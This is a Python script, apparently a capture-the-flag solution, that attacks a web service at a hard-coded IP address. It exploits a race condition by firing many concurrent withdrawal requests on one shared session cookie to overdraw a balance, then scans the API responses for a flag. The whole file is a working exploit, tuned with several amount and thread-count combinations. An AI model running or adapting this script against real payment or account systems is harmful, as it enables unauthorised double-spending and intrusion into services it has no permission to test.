import http.client, json, time, threading, queue, re

HOST = '52.76.96.108'
PORT = 3000

class Client:
    def __init__(self):
        self.cookie = None
    def post(self, path, body=None, headers=None):
        c = http.client.HTTPConnection(HOST, PORT, timeout=15)
        h = {'Content-Type': 'application/json'}
        if self.cookie:
            h['Cookie'] = self.cookie
        if headers:
            h.update(headers)
        c.request('POST', path, body=json.dumps(body) if body is not None else None, headers=h)
        r = c.getresponse()
        data = r.read()
        sc = r.getheader('Set-Cookie')
        if sc:
            self.cookie = sc.split(';',1)[0]
        c.close()
        try:
            return r.status, json.loads(data)
        except Exception:
            return r.status, data
    def get(self, path):
        c = http.client.HTTPConnection(HOST, PORT, timeout=15)
        h = {}
        if self.cookie:
            h['Cookie'] = self.cookie
        c.request('GET', path, headers=h)
        r = c.getresponse()
        data = r.read()
        sc = r.getheader('Set-Cookie')
        if sc:
            self.cookie = sc.split(';',1)[0]
        c.close()
        try:
            return r.status, json.loads(data)
        except Exception:
            return r.status, data

def find_flag(obj):
    if obj is None: return None
    if isinstance(obj, dict):
        for k,v in obj.items():
            if 'flag' in k.lower() or 'override' in k.lower() or 'settlement' in k.lower():
                if isinstance(v,(str,int)) and v:
                    return f"{k}={v!r}"
        for v in obj.values():
            f = find_flag(v)
            if f: return f
    elif isinstance(obj, list):
        for v in obj:
            f = find_flag(v)
            if f: return f
    return None

def attempt(round_id, amount, n_threads):
    # Each round: reset, then fire N concurrent withdraws on shared session cookie
    results = []
    shared = {'pending':'reset'}
    cl = Client()
    st, resp = cl.post('/api/reset')
    # ensure clean cookie
    cl2 = Client(); cl2.post('/api/reset')
    q = queue.Queue()
    def worker(i):
        w = Client()
        w.cookie = cl.cookie  # same session
        try:
            sc, r = w.post('/api/withdraw', {'amount': amount})
            q.put((i, sc, r))
        except Exception as e:
            q.put((i, 'ERR', str(e)))
    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(n_threads)]
    for t in threads: t.start()
    for t in threads: t.join()

    responses = []
    while not q.empty():
        responses.append(q.get())

    # poll balance many times
    flag_found = None
    for _ in range(40):
        sc, r = cl.post('/api/balance')
        flag_found = find_flag(r)
        if flag_found:
            break
        if r.get('pending', 0) == 0 and _ > 2:
            break
        time.sleep(0.4)
    print(f"--- round {round_id}: amount={amount} n={n_threads} ---")
    for rr in responses:
        print("  ", rr)
    print("  final balance:", cl.post('/api/balance'))
    if flag_found:
        print("[FLAG]", flag_found)
    return flag_found

# Try various amount/thread combos
combos = [
    (1.0, 20),
    (0.5, 30),
    (0.6, 20),
    (0.9, 15),
    (1.0, 5),
    (2.0, 20),
    (0.5, 60),
    (0.34, 6),
]

best = None
for idx, (amt, n) in enumerate(combos):
    f = attempt(idx, amt, n)
    if f:
        best = f
        print("FOUND:", f)
        break
    time.sleep(1)

if best:
    print("FINAL FLAG:", best)
else:
    print("No flag found with this combo set.")